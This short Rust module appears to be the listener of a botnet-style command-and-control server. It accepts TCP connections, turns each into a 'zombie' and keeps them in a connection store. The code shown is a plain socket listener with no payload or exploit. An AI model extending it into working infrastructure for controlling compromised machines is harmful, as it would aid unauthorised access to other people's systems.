mod zombie_processor;
mod connection_keeper;

use std::io::Error;
use log::{error, warn, info, debug, trace};
use std::net::{Ipv4Addr, SocketAddr, TcpListener, TcpStream};
use crate::connections::zombie_processor::craft_zombie;
use crate::connections::connection_keeper::ConnectionKeeper;

pub fn start_catching(addr: SocketAddr) {
    let mut connection_keeper: ConnectionKeeper = ConnectionKeeper::new();
    let listener = TcpListener::bind(addr).expect("Can't bound to {addr:?}");
    info!("Started listening on {addr:?}");
    for stream in listener.incoming() {
        let connection = match stream {
            Ok(connection) => connection,
            Err(e) => {
                error!("{}", e);
                continue;
            },
        };

        let zombie = craft_zombie(connection).expect("Failed to craft zombie");
        debug!("Crafted zombie: {zombie:?}");
        connection_keeper.add_zombie(zombie);
    }
}
